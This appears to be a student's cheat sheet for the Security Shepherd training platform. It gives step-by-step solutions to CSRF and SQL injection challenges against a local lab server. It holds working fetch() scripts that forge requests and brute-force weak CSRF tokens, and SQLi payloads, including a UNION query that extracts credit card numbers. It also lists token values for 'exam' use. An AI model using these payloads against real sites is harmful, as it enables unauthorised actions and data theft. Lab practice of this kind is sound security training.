Security Sheperd
CSRF total 9 types 

Create 2 accounts in security shepherd
One with your usn and other dummy acc

In ur acc for csrf challenge they provide you the url either get or post request
 
Something like this get request

Go to the other dummy acc and in the same logged in page paste the the following link
“https://localhost:8444/user/csrfchallengeone/plusplus?userid=ba93aa273227a7c7b4f66ce28f0723e5c777ed9d” just change the ip address and port and your userID to the main account , then enter it will show increment successful.
 Go back to main account check score board

IF it is post request 

Open console in the dummy acc browser 

Then use fetch function for example 








fetch('/user/csrfchallengetwo/plusplus', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'userid=ba93aa273227a7c7b4f66ce28f0723e5c777ed9d'
})
.then(r => r.text())
.then(console.log);


In the challenge page observe the body key values sometimes it is userid or userId

In some challenges it requires CSRF TOKEN it will be provided in Chanllenge page itself or you need to view page souce to get that token and modify and paste the below fetch function in the from the dummy account browser

fetch('/user/csrfchallengethree/plusplus', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'userid=61111c7bc5137e7e275289a1d4e413a02a7b6ec7&csrfToken=PASTE_TOKEN_HERE'
})
.then(r => r.text())
.then(console.log);

Careful with userId or userid it will be mentioned in challenge page itself

Some times csrf token will be just 1,2,3 etc use the below fetch function
If the challenge says CSRF 5











[0, 1, 2].forEach(token => {
  fetch('/user/csrfchallengefive/plusplus', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `userId=61111c7bc5137e7e275289a1d4e413a02a7b6ec7&csrfToken=${token}`
  })
  .then(r => r.text())
  .then(text => console.log('Token:', token, 'Response:', text));
});


CSRF 6
Use fetch function find the hidden csrf token in page source
fetch('/user/csrfchallengesix/plusplus', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'userId=61111c7bc5137e7e275289a1d4e413a02a7b6ec7&csrfToken=PASTE_TOKEN_HERE'
})
.then(r => r.text())
.then(console.log);

For CSRF 6 the following are only 3 tokens use in exam it might be any one of them
c4ca4238a0b923820dcc509a6f75849b
eccbc87e4b5ce2fe28308fd9f2a7baf3
c81e728d9d4c2f636f067f89cc14862c











Use for loop with fetch function

const userId = '61111c7bc5137e7e275289a1d4e413a02a7b6ec7';

const tokens = [
  'c4ca4238a0b923820dcc509a6f75849b',
  'eccbc87e4b5ce2fe28308fd9f2a7baf3',
  'c81e728d9d4c2f636f067f89cc14862c'
];

tokens.forEach(token => {
  const data = new URLSearchParams();
  data.set('userId', userId);
  data.set('csrfToken', token);

  fetch('/user/csrfchallengesix/plusplus', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: data.toString()
  })
  .then(r => r.text())
  .then(text => console.log('Token:', token, 'Response:', text));
});


CSRF JSON challenge

fetch('/user/csrfchallengejson/plusplus', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    userId: '61111c7bc5137e7e275289a1d4e413a02a7b6ec7'
  })
})
.then(r => r.text())
.then(console.log);

SOME TIMES IT WILL SAY INCREMENT FAILED YOUR NEW TOKEN IS -274732….. Use this new token and modify fetch function to send new request using new token



SQLi or SQL INJECTION


SQL 1

Use the following  in the input box

' OR '1'='1' -- 
' OR 1=1 -- 
1 OR 1=1 -- 
' OR 1=1 #


SQL 2
USE THIS IN INPUT BOX

' OR '1'='1
x@x'or'1'='1
1'or'1@1.1
a'!='1@1.1


SQL3

First type the given name in challenge box

Then go to network tab in dev tools then look at recent network log right click copy then copy as fetch use gpt 




fetch("https://127.0.0.1:8444/challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-requested-with": "XMLHttpRequest"
  },
  "referrer": "https://127.0.0.1:8444/challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6.jsp",
  "body": "theUserName=Mary+martin",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});

Put this to gpt and state the challenge it will provide you with something as follow

const data = new URLSearchParams();

data.set(
  "theUserName",
  "Mary Martin' UNION SELECT creditcardnumber FROM customers WHERE customerName='Mary Martin' #"
);

fetch("https://127.0.0.1:8444/challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6", {
  headers: {
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded",
    "x-requested-with": "XMLHttpRequest"
  },
  referrer: "https://127.0.0.1:8444/challenges/b7327828a90da59df54b27499c0dc2e875344035e38608fcfb7c1ab8924923f6.jsp",
  body: data.toString(),
  method: "POST",
  mode: "cors",
  credentials: "include"
})
.then(r => r.text())
.then(console.log);


